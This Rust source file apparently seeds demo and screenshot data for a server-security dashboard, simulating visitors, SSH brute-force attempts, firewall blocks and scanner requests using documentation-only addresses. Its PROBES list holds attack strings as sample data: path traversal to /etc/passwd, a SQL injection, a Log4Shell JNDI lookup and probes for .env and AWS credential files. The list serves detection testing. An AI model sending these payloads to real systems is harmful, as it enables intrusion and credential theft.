//! Fake but realistic data for demo mode and screenshots. Only documentation
//! IP ranges (RFC 5737, RFC 3849) and example.* domains are used.

use std::net::{IpAddr, Ipv4Addr, Ipv6Addr};

use anyhow::Result;

use crate::clock::{DAY, HOUR};
use crate::config::StorageConfig;
use crate::event::{HttpRequest, SecurityEvent, SecurityKind, SystemEvent, SystemKind};
use crate::probes::ProbeMatcher;
use crate::store::rollup::{NET_CT_RX, NET_CT_TX, NET_RX, NET_TX};
use crate::store::{Batch, Counter, Retention, Store};

/// Days of history that demo mode creates.
pub const DAYS: i64 = 90;

const BAN_TIME: i64 = 7 * DAY;

/// Relative traffic per hour of the day: quiet at night, busy in the evening.
const DAILY_SHAPE: [u64; 24] = [
    3, 2, 2, 1, 1, 2, 3, 5, 7, 8, 9, 9, 10, 10, 9, 9, 10, 11, 12, 12, 11, 9, 7, 5,
];

const SITES: &[(&str, u32)] = &[
    ("example.com", 70),
    ("example.org", 20),
    ("example.net", 10),
];

const PAGES: &[(&str, u32)] = &[
    ("/", 30),
    ("/shop/", 14),
    ("/shop/?page=2", 4),
    ("/product/104/", 6),
    ("/product/215/", 5),
    ("/product/388/", 4),
    ("/cart/", 5),
    ("/checkout/", 2),
    ("/account/login/", 3),
    ("/about/", 2),
    ("/static/css/site.css", 10),
    ("/static/js/app.js", 10),
    ("/media/products/104.webp", 8),
    ("/favicon.ico", 4),
    ("/robots.txt", 1),
    ("/sitemap.xml", 1),
];

const PROBES: &[&str] = &[
    "/.env",
    "/.env.production",
    "/.git/config",
    "/wp-login.php",
    "/wp-admin/setup-config.php",
    "/xmlrpc.php",
    "/phpmyadmin/index.php",
    "/backup.sql",
    "/db.sqlite3",
    "/.aws/credentials",
    "/cgi-bin/luci",
    "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "/static/../../../../etc/passwd",
    "/product/?id=1%20UNION%20SELECT%20username,password",
    "/?x=${jndi:ldap://example.net/a}",
    "/actuator/env",
];

const BROWSERS: &[&str] = &[
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (X11; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0",
    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Mobile Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1)",
];

const SCANNERS: &[&str] = &[
    "curl/8.5.0",
    "python-requests/2.32.3",
    "Go-http-client/1.1",
    "Mozilla/5.0 zgrab/0.x",
    "-",
];

const SSH_USERS: &[&str] = &[
    "root", "admin", "ubuntu", "test", "oracle", "postgres", "git",
];

/// The admin's two SSH keys: a laptop most days, a phone now and then.
pub const LAPTOP_KEY: &str = "SHA256:Zm9yIHRoZSBkZW1vIGxhcHRvcCBrZXk";
pub const PHONE_KEY: &str = "SHA256:ZGVtbyBwaG9uZSBrZXkgb25seQ";
const PHONE: &str = "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1";

const FIREWALL_PORTS: &[u16] = &[
    23, 445, 1433, 2375, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 9200,
];

/// Fills the store with `days` of history ending at `now`.
pub fn seed(store: &mut Store, probes: &ProbeMatcher, now: i64, days: i64) -> Result<()> {
    let mut rng = Rng(0x00c0_ffee);
    let retention = Retention::from(&StorageConfig::default());
    let mut hour = (now - days * DAY) / HOUR * HOUR;
    while hour < now {
        let (http, security) = generate_hour(&mut rng, probes, hour, now);
        let batch = Batch {
            source: "demo".into(),
            counters: network_counters(hour, &http),
            system: failed_backup(hour, now),
            http,
            security,
            ..Batch::default()
        };
        store.save(&batch, now, &retention)?;
        hour += HOUR;
    }
    Ok(())
}

fn generate_hour(
    rng: &mut Rng,
    probes: &ProbeMatcher,
    hour: i64,
    now: i64,
) -> (Vec<HttpRequest>, Vec<SecurityEvent>) {
    let hour_of_day = ((hour / HOUR) % 24) as usize;
    let mut requests = Vec::new();
    let mut events = Vec::new();

    for _ in 0..DAILY_SHAPE[hour_of_day] * 9 + rng.below(20) {
        let ts = hour + rng.below_i64(HOUR);
        requests.push(visitor_request(rng, probes, ts));
    }
    for _ in 0..4 + rng.below(16) {
        let ts = hour + rng.below_i64(HOUR);
        requests.push(scanner_request(rng, probes, ts));
    }
    for _ in 0..rng.below(4) {
        let ts = hour + rng.below_i64(HOUR);
        ssh_attack(rng, ts, &mut events);
    }
    for _ in 0..10 + rng.below(40) {
        let ts = hour + rng.below_i64(HOUR);
        events.push(firewall_block(rng, ts));
    }
    // The admin logs in most mornings and evenings, and checks the shop
    // and the dashboard from a phone.
    let admin = IpAddr::V4(Ipv4Addr::new(192, 0, 2, 10));
    if matches!(hour_of_day, 9 | 18) && rng.below(3) > 0 {
        let ts = hour + rng.below_i64(HOUR);
        let key = if rng.below(8) == 0 {
            PHONE_KEY
        } else {
            LAPTOP_KEY
        };
        let detail = format!("publickey as admin, key {key}");
        events.push(security(
            ts,
            SecurityKind::SshLogin,
            "sshd",
            admin,
            Some(22),
            Some(&detail),
        ));
    }
    if hour_of_day == 20 && rng.below(2) == 0 {
        let ts = hour + rng.below_i64(HOUR);
        let device = crate::device::describe(PHONE);
        events.push(security(
            ts,
            SecurityKind::Login,
            "Shop admin",
            admin,
            None,
            Some(&device),
        ));
        let detail = format!("admin · {device}");
        events.push(security(
            ts + 60,
            SecurityKind::Login,
            "core-pulse",
            admin,
            None,
            Some(&detail),
        ));
    }
    if rng.below(30) == 0 {
        let ts = hour + rng.below_i64(HOUR);
        events.push(security(
            ts,
            SecurityKind::LoginFail,
            "Shop admin",
            scanner_ip(rng),
            None,
            Some("Python script"),
        ));
    }

    requests.retain(|r| r.ts <= now);
    events.retain(|e| e.ts <= now);
    (requests, events)
}

/// A nightly backup that started failing two days ago.
fn failed_backup(hour: i64, now: i64) -> Vec<SystemEvent> {
    let failing = hour >= now - 2 * DAY && (hour / HOUR) % 24 == 3;
    if !failing {
        return Vec::new();
    }
    vec![SystemEvent {
        ts: hour + 300,
        kind: SystemKind::ServiceFailed,
        name: "backup.service".into(),
        detail: Some("exit-code".into()),
    }]
}

/// Interface bytes that roughly match the hour's requests.
fn network_counters(hour: i64, requests: &[HttpRequest]) -> Vec<Counter> {
    let count = i64::try_from(requests.len()).unwrap_or(0);
    let sent: i64 = requests
        .iter()
        .map(|r| i64::try_from(r.bytes).unwrap_or(0))
        .sum();
    let counter = |metric, name: &str, value| Counter {
        ts: hour,
        metric,
        name: name.into(),
        value,
    };
    vec![
        counter(NET_RX, "eth0", count * 1_400),
        counter(NET_TX, "eth0", sent + count * 600),
        counter(NET_RX, "br-app", count * 900),
        counter(NET_TX, "br-app", sent),
        counter(NET_CT_RX, "nginx (3f9c1a2b7d4e)", count * 800),
        counter(NET_CT_TX, "nginx (3f9c1a2b7d4e)", sent),
        counter(NET_CT_RX, "gunicorn (8a71c0e2f5b9)", count * 500),
        counter(NET_CT_TX, "gunicorn (8a71c0e2f5b9)", sent * 2 / 3),
        counter(NET_CT_RX, "postgres (c42d9e8b1a07)", count * 40),
        counter(NET_CT_TX, "postgres (c42d9e8b1a07)", count * 90),
    ]
}

fn visitor_request(rng: &mut Rng, probes: &ProbeMatcher, ts: i64) -> HttpRequest {
    let site = *rng.weighted(SITES);
    let client = visitor_ip(rng);
    // The main site sits behind a CDN-style proxy; the others are reached directly.
    let peer = if site == "example.com" {
        proxy_ip(rng)
    } else {
        client
    };
    let target = *rng.weighted(PAGES);
    let method = if target == "/cart/" && rng.below(3) == 0 {
        "POST"
    } else {
        "GET"
    };
    let status = match rng.below(1000) {
        0..=849 => 200,
        850..=919 => 304,
        920..=959 => 301,
        960..=994 => 404,
        _ => 502,
    };
    let bytes = match status {
        200 => 600 + rng.below(80_000),
        404 | 502 => 150 + rng.below(500),
        _ => 0,
    };

    HttpRequest {
        ts,
        site: site.into(),
        client_ip: client,
        peer_ip: peer,
        method: method.into(),
        path: strip_query(target).into(),
        query: None,
        status,
        bytes,
        user_agent: rng.pick(BROWSERS).to_string(),
        probe: probes.classify(target).map(str::to_string),
    }
}

fn scanner_request(rng: &mut Rng, probes: &ProbeMatcher, ts: i64) -> HttpRequest {
    let site = *rng.weighted(SITES);
    let client = scanner_ip(rng);
    // Scanners often skip the proxy and hit the server address directly.
    let peer = if site == "example.com" && rng.below(2) == 0 {
        proxy_ip(rng)
    } else {
        client
    };
    let target = *rng.pick(PROBES);
    // Attacks hidden in the query usually just get the normal page back.
    let status = if target.contains('?') {
        200
    } else {
        *rng.pick(&[444u16, 404, 403, 400])
    };

    HttpRequest {
        ts,
        site: site.into(),
        client_ip: client,
        peer_ip: peer,
        method: if rng.below(5) == 0 { "POST" } else { "GET" }.into(),
        path: strip_query(target).into(),
        query: target.split_once('?').map(|(_, query)| query.to_string()),
        status,
        bytes: if status == 444 {
            0
        } else {
            120 + rng.below(300)
        },
        user_agent: rng.pick(SCANNERS).to_string(),
        probe: probes.classify(target).map(str::to_string),
    }
}

/// A failed SSH login, the ban that follows and the unban a week later.
fn ssh_attack(rng: &mut Rng, ts: i64, events: &mut Vec<SecurityEvent>) {
    let ip = scanner_ip(rng);
    let detail = format!("invalid user {}", rng.pick(SSH_USERS));
    events.push(security(
        ts,
        SecurityKind::SshFail,
        "sshd",
        ip,
        Some(22),
        Some(&detail),
    ));
    events.push(security(ts + 1, SecurityKind::Ban, "sshd", ip, None, None));
    events.push(security(
        ts + BAN_TIME,
        SecurityKind::Unban,
        "sshd",
        ip,
        None,
        None,
    ));
    // A few repeat offenders get the long recidive ban.
    if rng.below(25) == 0 {
        events.push(security(
            ts + 2,
            SecurityKind::Ban,
            "recidive",
            ip,
            None,
            None,
        ));
    }
}

fn firewall_block(rng: &mut Rng, ts: i64) -> SecurityEvent {
    let ip = if rng.below(3) == 0 {
        visitor_ip(rng)
    } else {
        scanner_ip(rng)
    };
    let port = *rng.pick(FIREWALL_PORTS);
    security(
        ts,
        SecurityKind::FirewallBlock,
        "ufw",
        ip,
        Some(port),
        Some("TCP"),
    )
}

fn security(
    ts: i64,
    kind: SecurityKind,
    source: &str,
    ip: IpAddr,
    port: Option<u16>,
    detail: Option<&str>,
) -> SecurityEvent {
    SecurityEvent {
        ts,
        kind,
        source: source.into(),
        ip,
        port,
        detail: detail.map(str::to_string),
    }
}

fn visitor_ip(rng: &mut Rng) -> IpAddr {
    match rng.below(10) {
        0 => IpAddr::V6(Ipv6Addr::new(
            0x2001,
            0xdb8,
            rng.below(16) as u16,
            0,
            0,
            0,
            0,
            1 + rng.below(200) as u16,
        )),
        1..=5 => IpAddr::V4(Ipv4Addr::new(192, 0, 2, 1 + rng.below(199) as u8)),
        _ => IpAddr::V4(Ipv4Addr::new(198, 51, 100, 1 + rng.below(199) as u8)),
    }
}

fn scanner_ip(rng: &mut Rng) -> IpAddr {
    IpAddr::V4(Ipv4Addr::new(203, 0, 113, 1 + rng.below(120) as u8))
}

fn proxy_ip(rng: &mut Rng) -> IpAddr {
    IpAddr::V4(Ipv4Addr::new(198, 51, 100, 200 + rng.below(10) as u8))
}

fn strip_query(target: &str) -> &str {
    target.split_once('?').map_or(target, |(path, _)| path)
}

/// Small deterministic PRNG (SplitMix64), so demo data is the same every run.
struct Rng(u64);

impl Rng {
    fn next_u64(&mut self) -> u64 {
        self.0 = self.0.wrapping_add(0x9e37_79b9_7f4a_7c15);
        let mut z = self.0;
        z = (z ^ (z >> 30)).wrapping_mul(0xbf58_476d_1ce4_e5b9);
        z = (z ^ (z >> 27)).wrapping_mul(0x94d0_49bb_1331_11eb);
        z ^ (z >> 31)
    }

    fn below(&mut self, n: u64) -> u64 {
        self.next_u64() % n
    }

    fn below_i64(&mut self, n: i64) -> i64 {
        (self.next_u64() % n.unsigned_abs()) as i64
    }

    fn pick<'a, T>(&mut self, items: &'a [T]) -> &'a T {
        &items[self.below(items.len() as u64) as usize]
    }

    fn weighted<'a, T>(&mut self, items: &'a [(T, u32)]) -> &'a T {
        let total: u64 = items.iter().map(|(_, w)| u64::from(*w)).sum();
        let mut roll = self.below(total);
        for (item, weight) in items {
            let weight = u64::from(*weight);
            if roll < weight {
                return item;
            }
            roll -= weight;
        }
        &items[items.len() - 1].0
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::probes::default_rules;
    use ipnet::IpNet;

    const NOW: i64 = 1_700_000_000;

    fn probes() -> ProbeMatcher {
        ProbeMatcher::new(&default_rules()).unwrap()
    }

    fn is_documentation(ip: IpAddr) -> bool {
        [
            "192.0.2.0/24",
            "198.51.100.0/24",
            "203.0.113.0/24",
            "2001:db8::/32",
        ]
        .iter()
        .any(|net| net.parse::<IpNet>().unwrap().contains(&ip))
    }

    #[test]
    fn uses_only_documentation_addresses_and_domains() {
        let probes = probes();
        let mut rng = Rng(1);
        for hours_ago in 1..=48 {
            let (requests, events) = generate_hour(&mut rng, &probes, NOW - hours_ago * HOUR, NOW);
            for r in &requests {
                assert!(
                    is_documentation(r.client_ip) && is_documentation(r.peer_ip),
                    "{r:?}"
                );
                assert!(r.site.starts_with("example."), "{}", r.site);
            }
            for e in &events {
                assert!(is_documentation(e.ip), "{e:?}");
            }
        }
    }

    #[test]
    fn probes_and_pages_are_classified_as_expected() {
        let probes = probes();
        for target in PROBES {
            assert!(probes.classify(target).is_some(), "{target}");
        }
        for (target, _) in PAGES {
            assert!(probes.classify(target).is_none(), "{target}");
        }
    }

    #[test]
    fn nothing_is_dated_in_the_future() {
        let probes = probes();
        let mut rng = Rng(3);
        let (requests, events) = generate_hour(&mut rng, &probes, NOW - HOUR / 2, NOW);
        assert!(requests.iter().all(|r| r.ts <= NOW));
        assert!(events.iter().all(|e| e.ts <= NOW));
    }

    #[test]
    fn seed_fills_the_store() {
        let mut store = Store::open_in_memory().unwrap();
        seed(&mut store, &probes(), NOW, 2).unwrap();
        let (requests, events) = store.counts().unwrap();
        assert!(requests > 500, "{requests}");
        assert!(events > 200, "{events}");
    }
}
